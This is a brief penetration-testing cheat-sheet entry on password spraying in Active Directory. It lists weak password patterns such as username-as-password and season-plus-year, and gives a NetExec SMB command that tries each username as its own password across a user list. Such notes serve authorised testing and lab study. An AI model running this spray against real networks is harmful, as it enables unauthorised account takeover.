# Password Spraying

> When you get an account on an active directory, the first thing to do is always getting the full list of users.\
> Once you get it you could do a password spray on the full user list (very often you will find other accounts with weak password like username=password, SeasonYear!, SocietynameYear! or even 123456).

## Username = Password

```bash
nxc smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```
